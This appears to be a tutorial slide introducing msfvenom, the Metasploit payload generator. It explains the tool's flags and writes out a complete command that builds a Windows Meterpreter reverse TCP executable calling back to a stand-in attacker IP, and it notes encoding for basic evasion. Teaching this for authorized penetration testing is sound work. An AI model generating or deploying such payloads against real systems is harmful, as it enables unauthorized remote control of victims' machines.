Tool Overview

Introducing `msfvenom`

`msfvenom` is a command-line utility within the Metasploit Framework used to generate various types of payloads (e.g., reverse shells, bind shells) in numerous formats (e.g., EXE, DLL, raw shellcode).

  • Combines `msfpayload` and `msfencode` functionalities.
  • Supports multiple platforms (Windows, Linux, macOS).
  • Essential for crafting custom malicious executables.
  • Allows encoding for basic evasion.
Key Takeaway

`msfvenom` is the go-to tool for generating tailored payloads, offering flexibility in type and format for diverse exploitation scenarios.

Example: Windows Meterpreter Payload
# Generate a Windows executable for a Meterpreter reverse TCP shell
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=YOUR_KALI_IP \
         LPORT=4444 \
         -f exe \
         -o payload.exe

-p (payload): Specifies the payload to use (e.g., `windows/meterpreter/reverse_tcp`).

LHOST: Local host IP address (your attacking machine's IP).

LPORT: Local port to listen on for the reverse connection.

-f (format): Output format (e.g., `exe` for Windows executable).

-o (output): Output file name (e.g., `payload.exe`).
